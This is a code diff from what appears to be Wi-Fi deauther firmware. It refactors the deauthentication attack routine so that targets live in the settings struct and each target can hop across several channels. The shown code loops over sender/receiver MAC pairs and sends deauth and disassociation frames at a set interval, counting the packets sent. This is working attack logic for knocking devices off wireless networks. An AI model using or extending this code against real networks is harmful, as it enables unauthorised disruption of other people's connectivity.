@@ -23,8 +23,6 @@ typedef struct deauth_attack_data_t {
 
     deauth_attack_settings_t settings;
 
-    TargetList targets;
-
     unsigned long start_time;
     unsigned long output_time;
     unsigned long pkts_sent;
@@ -55,7 +53,7 @@ bool send_disassoc(uint8_t ch, const uint8_t* sender, const uint8_t* receiver) {
 // ========== ATTACK FUNCTIONS ========== //
 void startDeauth(const deauth_attack_settings_t& settings) {
     { // Error checks
-        if (!settings.targets || (settings.targets->size() == 0)) {
+        if (settings.targets.size() == 0) {
             debuglnF("ERROR: No targets specified");
             return;
         }
@@ -72,7 +70,6 @@ void startDeauth(const deauth_attack_settings_t& settings) {
     deauth_data.enabled = true;
 
     deauth_data.settings = settings;
-    deauth_data.targets.moveFrom(*settings.targets);
 
     deauth_data.start_time      = current_time;
     deauth_data.output_time     = current_time;
@@ -105,19 +102,19 @@ void startDeauth(const deauth_attack_settings_t& settings) {
         else debugln('-');
 
         debugF("Targets:        ");
-        debugln(deauth_data.targets.size());
+        debugln(deauth_data.settings.targets.size());
 
         // Print MACs
-        deauth_data.targets.begin();
+        deauth_data.settings.targets.begin();
 
-        while (deauth_data.targets.available()) {
-            Target* t = deauth_data.targets.iterate();
+        while (deauth_data.settings.targets.available()) {
+            const target_t* t = deauth_data.settings.targets.iterate();
             debugF("- transmitter ");
-            debug(strh::mac(t->getSender()));
+            debug(strh::mac(t->sender));
             debugF(", receiver ");
-            debug(strh::mac(t->getReceiver()));
-            debugF(", channel ");
-            debugln(t->getCh());
+            debug(strh::mac(t->receiver));
+            debugF(", channels ");
+            debugln(strh::channels(t->channels));
         }
 
         debugln();
@@ -130,7 +127,7 @@ void stopDeauth() {
     if (deauth_data.enabled) {
         deauth_data.enabled    = false;
         deauth_data.pkts_sent += deauth_data.pkts_per_second;
-        deauth_data.targets.clear();
+        deauth_data.settings.targets.clear();
 
         debugF("Stopped deauth attack. Sent ");
         debug(deauth_data.pkts_sent);
@@ -162,23 +159,25 @@ void update_deauth_attack() {
         }
 
         if (millis() - deauth_data.pkt_time >= deauth_data.pkt_interval) {
-            Target* t = deauth_data.targets.iterate();
+            const target_t* t = deauth_data.settings.targets.iterate();
 
-            if (deauth_data.settings.deauth) deauth_data.pkts_per_second += send_deauth(
-                    t->getCh(),
-                    t->getSender(),
-                    t->getReceiver()
-                    );
+            const uint8_t* sender   = t->sender;
+            const uint8_t* receiver = t->receiver;
+            uint8_t ch              = sysh::next_ch(t->channels);
 
-            if (deauth_data.settings.disassoc) deauth_data.pkts_per_second += send_disassoc(
-                    t->getCh(),
-                    t->getSender(),
-                    t->getReceiver()
-                    );
+            if (deauth_data.settings.deauth) {
+                deauth_data.pkts_per_second += send_deauth(ch, sender, receiver);
+            }
+
+            if (deauth_data.settings.disassoc) {
+                deauth_data.pkts_per_second += send_disassoc(ch, sender, receiver);
+            }
 
             deauth_data.pkt_time = millis();
         }
 
-        if (!deauth_data.targets.available()) deauth_data.targets.begin();
+        if (!deauth_data.settings.targets.available()) {
+            deauth_data.settings.targets.begin();
+        }
     }
 }
